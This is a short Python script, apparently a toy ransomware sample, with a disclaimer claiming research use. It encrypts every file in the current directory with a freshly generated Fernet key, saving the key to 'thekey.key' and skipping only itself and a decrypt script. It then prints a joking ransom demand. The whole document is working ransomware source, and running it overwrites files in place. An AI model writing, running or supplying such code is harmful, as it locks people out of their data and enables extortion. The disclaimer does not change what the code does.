#!/usr/bin/env python3

# DISCLAIMER: This code is provided for research and detection purposes only.
# It is intended to be used responsibly and legally to protect computer systems,
# data, and networks from potential threats. Any misuse of this code for malicious
# purposes is strictly prohibited and may be subject to legal consequences.

import os
from cryptography.fernet import Fernet

# Function to find eligible files in the current directory
def find_eligible_files():
    eligible_files = []
    for file in os.listdir():
        if file not in ["foodie.py", "thekey.key", "decrypt.py"] and os.path.isfile(file):
            eligible_files.append(file)
    return eligible_files

def main():
    # Let's find some eligible files
    files = find_eligible_files()

    if not files:
        print("No eligible files found.")
        return

    print("Eligible files:", files)

    # Generate an encryption key
    key = Fernet.generate_key()

    # Save the key to a file named "thekey.key"
    with open("thekey.key", "wb") as key_file:
        key_file.write(key)

    # Encrypt eligible files using the generated key
    for file in files:
        with open(file, "rb") as input_file:
            contents = input_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as output_file:
            output_file.write(contents_encrypted)

    print("All of your files have been encrypted!! Send me a Happy Meal with Chocolate Milk!!")

if __name__ == "__main__":
    main()
